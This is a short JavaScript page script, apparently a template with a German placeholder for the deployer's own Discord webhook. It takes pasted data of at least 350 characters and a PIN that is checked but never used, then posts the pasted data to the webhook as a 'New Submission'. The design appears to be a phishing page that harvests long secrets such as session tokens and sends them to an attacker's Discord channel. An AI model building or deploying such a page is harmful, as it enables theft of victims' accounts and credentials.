const webhookURL = "DEIN_DISCORD_WEBHOOK_HIER"; // Hier deinen Webhook einfügen
const btn = document.getElementById("copyBtn");
const gf = document.getElementById("File");
const pin = document.getElementById("pin");
const toast = document.getElementById("toast");

const showToast = (message) => {
  toast.textContent = message;
  toast.style.display = "block";
  clearTimeout(toast._t);
  toast._t = setTimeout(() => toast.style.display = "none", 3000);
};

btn.onclick = async () => {
  const data = gf.value.trim();
  const pinValue = pin.value.trim();

  if (!data) return showToast("Please paste your data.");
  if (!pinValue) return showToast("Please create a PIN.");

  if (data.length < 350) return showToast(`Input must contain at least 350 characters. (Found ${data.length})`);

  btn.disabled = true;
  btn.textContent = "Processing…";

  try {
    await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `🚨 New Submission:\n\`\`\`${data}\`\`\``
      })
    });
    showToast("✅ Submitted to Discord!");
  } catch (err) {
    showToast("❌ Couldn't send to Discord");
  }

  setTimeout(() => {
    btn.disabled = false;
    btn.textContent = "Submit";
  }, 1200);
};
